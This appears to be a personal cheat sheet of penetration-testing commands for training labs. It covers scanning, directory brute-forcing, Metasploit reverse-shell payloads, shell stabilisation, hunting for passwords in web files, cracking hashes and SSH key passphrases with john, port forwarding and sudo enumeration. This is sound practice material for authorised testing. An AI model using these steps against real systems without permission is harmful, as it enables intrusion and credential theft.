Nmap fast scan full ports:

nmap -p- --min-rate 10000 <ip>

Gobuster commands:
gobuster dir -u http://10.129.89.220/ -w /usr/share/wordlists/dirb/common.txt
Gobuster command with fast scan with speicifc extension type:
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40

searchsploit <CMS Name/Package>

metsaploit note:  
search exploit in msfconsole:

search <Software Name>
Always run "check" command before running any exploit.
Try with both x86 and x64 payloads:

set payload linux/x64/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp

Lateral Moments:

Get interactive shell and set enviroment:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash

serach string in directory:
grep -rni "passwd" www/ 

following file can show the websites other webiste's configuration if any internal application is running:

cat /etc/apache2/sites-enabled/internal.conf

Following command can be used to crack the hash:

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash.txt 

Run following command for local port forwarding to your host:

ssh jimmy@10.129.88.23 -L 52846:localhost:52846

Above command used to access a website running internally from your machine.

Following steps can be use to crack the password of private key (id_rsa).

sh2john.py id_rsa > hash

above command will convert the key in format that john the ripper can understand:

Then Following command can be used to crack the password

john --wordlist=/usr/share/wordlists/rockyou.txt hash

You can use following command to set permission of id_rsa key to use it.

chmod 600 id_rsa

following command shows the files which can be run as sudo

sudo -l
